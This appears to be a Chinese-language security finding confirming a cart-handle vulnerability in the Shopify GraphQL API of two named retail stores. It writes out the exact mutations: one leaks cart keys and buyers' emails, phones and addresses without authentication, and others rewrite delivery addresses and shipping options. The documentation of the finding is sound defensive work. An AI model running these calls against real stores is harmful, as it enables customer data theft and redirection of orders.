# 复核结论（两店同型，2026-11-11 UTC）
对 The Game Collection 的 www（The Game Collection）与 collect（TGC Collectables，独立 shop）两个 Shopify 店，KB#606/#590 的打法逐项成立：

- `POST /api/graphql` 的 `cartPrepareForCompletion(cartId:"gid://shopify/Cart/<25位handle>")` **不校验 ?key、不需要 Cookie**；返回 `CartStatusReady` 且 `cart.id` 回显真实 `?key=<32hex>`，同时回显 `buyerIdentity.email/phone` 与 `delivery.addresses{selected,address{firstName,lastName,address1,address2,city,company,provinceCode,zip,countryCode,phone}}`、`deliveryGroups{deliveryOptions{handle,title},selectedDeliveryOption}`。
- 三态对照：正确 key ≡ 裸 handle ≡ 错误 key（逐字相同）；随机 handle → `result:null`。
- 用泄露 key（仍在无 Cookie 会话）：
  - `cartDeliveryAddressesUpdate(cartId:"gid://.../<handle>?key=<LEAK>", addresses:[{id:<CartSelectableAddress id>, address:{deliveryAddress:{...}}, selected:true}])` → `userErrors:[]`，地址改写持久化；
  - `cartSelectedDeliveryOptionsUpdate(cartId:"...?key=<LEAK>", selectedDeliveryOptions:[{deliveryGroupId:"gid://shopify/CartDeliveryGroup/<id>?cart=<handle>", deliveryOptionHandle:"<handle>"}])` → `userErrors:[]`，配送切换持久化（collect 店 3 档：Tracked 48 / Tracked 24 / Courier Next Day，48→24 可观测）。

# 两店差异
- www 仅 1 个 Standard 配送选项（写调用成功但无可观测切换）；collect 有 3 个选项可观测改选。
- 两家 `/api/graphql` 未版本化路径行为一致。

# 判据与门槛
handle 为 108bit 随机不可枚举；攻击前提是 handle 经分享购物车链接 / Referer / 页面 `ShopifyAnalytics.meta.cart.id` 等渠道泄漏。未调 `cartSubmitForCompletion`、未下单。